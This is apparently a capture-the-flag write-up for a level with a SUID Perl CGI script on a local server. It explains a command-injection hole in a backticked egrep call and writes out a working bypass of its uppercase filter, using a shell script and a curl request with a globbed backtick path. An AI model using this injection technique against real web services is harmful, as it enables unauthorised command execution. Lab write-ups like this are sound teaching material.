for this level we have a suid perl script own by the user flag13
that serve a local server on port 4646

the server is a http server that use GCI

the script eval the shell command with the `x` parameter
	$xx =~ tr/a-z/A-Z/;
	$xx =~ s/\s.*//;
	@output = `egrep "^$xx" /tmp/xd 2>&1`;

here we got a command evaluation for grep with a string that pass throught a regex modifier
any alphabetic character are transform to uppercase character
then if there is a whitespace, it and all the following character will be remove

so we create a script in uppercase that send the getflag command to a file

$> echo 'getflag > /tmp/lv12' > /tmp/MAJUSCULE
$> chmod +x /tmp/MAJUSCULE

the wildcard here will match only the /tmp/MAJUSCULE file
since there isn't any other file that match the /*/MAJUSCULE path

$> curl 'localhost:4646?x=`/*/MAJUSCULE`'
